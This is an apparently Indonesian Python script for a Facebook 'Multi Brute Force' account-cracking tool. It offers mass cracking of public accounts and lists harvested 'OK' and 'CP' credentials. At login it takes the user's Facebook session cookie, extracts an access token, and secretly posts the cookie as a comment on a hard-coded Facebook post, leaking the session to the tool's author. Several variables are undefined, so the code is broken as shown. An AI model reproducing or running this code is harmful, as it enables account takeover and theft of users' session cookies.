###----------[ IMPORT MODULE ]----------###
import requests,bs4,json,os,sys,random,subprocess,datetime,time,re,urllib3,rich,base64,logging
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktujeda
from rich import print as basariheker
from threading import (Thread, Event)
###----------[ GLOBAL NAMA ]----------###
id,id2,uid = [],[],[]
xbz,xnxx = [],[]
tokenefb = []
akunyeh = []
loop,baz = 0,[]
ok,cp,oo = 0,0,[]
ualu,ualuh = [],[]
###----------[ PROXI N UGENT ]----------###
try:
	proxi= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('proxi.txt','w').write(proxi)
except Exception as e:
	basariheker('gagal om')
proxy=open('proxi.txt','r').read().splitlines()
ua = random.choice(open('ua.txt','r').read().splitlines())
ug = random.choice(open('ug.txt','r').read().splitlines())
###----------[ UNTUK PEWARNA ]----------###
M = '\033[1;31m' #merah
K = '\033[1;33m' #kuning
H = '\033[1;32m' #hijau
B = '\033[1;34m' #biru
U = '\033[1;35m' #ungu
C = '\033[1;36m' #cyan
P = '\x1b[1;97m' #putih
Z = '\33[m' #gadawarna
###----------[ CONVERT BULAN ]----------###
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
###----------[ UNTUK ANIMASI ]----------###
def basari_tamvan(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();waktujeda(0.05)
def basari_id(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();waktujeda(0.01)
###----------[ BANNER MENUH ]----------###
def banner():
	os.system('clear')
	print(f'{C}========================================{Z}')
	print(f"""{H}[•]{Z} {P}Basari Multi Brute Force{Z} {H}[•]{Z}
{H}  ____  __  __ ____  ______ 
{H} |  _ \|  \/  |  _ \|  ____|
 {H}| |_) | \  / | |_) | |__   
{H} |  _ <| |\/| |  _ <|  __|  
{H} | |_) | |  | | |_) | |     
{H} |____/|_|  |_|____/|_| {x}{P}V.4.0.4     {Z}""")
	print(f'{C}========================================{Z}')
###----------[ LOGIN COOKIES ]----------###
def login():
	try:
		token = open('.tokenakun.txt','r').read()
		cok = open('.cookiesakun.txt','r').read()
		tokenefb.append(token)
		try:
			bazariheker = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenefb[0], cookies={'cookie':cok})
			basganteng = json.loads(bazariheker.text)['id']
			menu(bazganteng)
		except KeyError:
			login_bas()
		except requests.exceptions.ConnectionError:
			basari_tamvan(f'{bas}[!] KONEKSI EROR BRO COBA LAGI !{x}')
			exit()
	except IOError:
		login_bas()
def login_bas():
	try:
		os.system('clear')
		banner()
		cookie=input(f'[{H}•{Z}] Masukkan Cookies :{H} ')
		print(f'{C}========================================{Z}')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		requests.post(f"https://graph.facebook.com/v15.0/100072216287842_213375447746330/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
		ken = open(".tokenakun.txt", "w").write(tok)
		cok = open(".cookiesakun.txt", "w").write(cookie)
		print(f'{x}[{H}•{Z}]{H} SELAMAT ANDA BERHASIL LOGIN !{Z} ');waktujeda(1)
		print(f'{C}========================================{Z}')
		print(f'{x}[{H}•{Z}]{H} JALANKAN LAGI PERINTAHNYA !{x} ');waktujeda(1)
		print(f'{C}========================================{Z}')
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'%s[%sx%s]%s LOGIN GAGAL ! GANTI COOKIES !%s'%(Z,K,Z,M,Z))
		print(f'{C}========================================{Z}')
		exit()
###----------[ BAGIAN MENU ]----------###
def menu(bas_id):
	try:
		cok = open('.cookiesakun.txt','r').read()
	except IOError:
		os.system('rm -rf .tokeneakun.txt && rm -rf .cookiesakun.txt')
		basari_id(f'{mer}cookies telah kadaluarsa ster')
		waktujeda(1)
		login_bas()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	basari_tamvan(f'{P}[>] ID  : '+str(bas_id))
	basari_tamvan(f'{P}[>] IP  : {ip}{Z}')
	print(f'{C}========================================{Z}')
	basariheker(' [•] 1. Crack Publik Massal\n [•] 2. Crack Dari File\n [•] 3. Cek Opsi Akun\n [•] 4. Hasil Crack Akun\n [•] 5. Lapor Bug Sc\n [•] 0. Keluar Hapus Coki')
	print(f'{C}========================================{Z}')
	basari_sayang_syafaa = input(f'{P}[?] Pilih :{Z} ')
	print(f'{C}========================================{Z}')
	if basari_sayang_syafaa in ['01','1']:
		crack_massal()
	elif basari_sayang_syafaa in ['02','2']:
		crack_file()
	elif basari_sayang_syafaa in ['03','3']:
		cek_opsi()
	elif basari_sayang_syafaa in ['04','4']:
		cek_hasil()
	elif basari_sayang_syafaa in ['05','5']:
		lapor_bug()
	elif basari_sayang_syafaa in ['00','0']:
		os.system('rm -rf .tokeneakun.txt && rm -rf .cookiesakun.txt')
		print(f'{P}[!] {M}Sukses Logout+Hapus Cookies{Z} ')
		waktujeda(1)
		exit()
	else:
		print(f'{P}[!] {M}Pilih Yang Bener Lah Om')
		waktujeda(2)
		login()
def lapor_bug():
	os.system("xdg-open https://www.facebook.com/bazcracker")
	login()

###----------[ CEK HASIL ]----------###
def result():
	print(f'{P}[!] 1. Hasil{Z} {K}OK{Z} {P}Anda{Z} ')
	print(f'{P}[!] 2. Hasil{Z} {K}CP{Z} {P}Anda{Z} ')
	print(f'{P}[!] 3. Kembali{Z} ')
	print(f'{C}========================================{Z}')
	baz_code = input(f'{P}[?] Pilih :{x} ')
	if baz_code in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('[!] File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('[!] Tidak Ada Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[!] %s. %s ({k} %s {x}Id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('[?] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('[!] Pilih Yang Bener Cuk ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('[!] File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}[!] {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{b} Tekan Enter Untuk Kembali{x} ]')
			back()
	elif baz_code in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('[!] File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('[!] Tidak Ada Hasil OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[!] %s. %s ( {h}%s{x} Id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'[!] %s. %s ({h} %s {x}Id )'%(cih,isi,(len(hem))))
			geeh = input(f'\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('[!] Pilih Yang Bener Lah ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('[!] File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}[!] {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{b} Tekan Enter Untuk Kembali{x} ]')
			back()
	elif baz_code in ['3']:
		back()
	else:
		print('[!] Pilih Yang Bener Lah ')
		back()







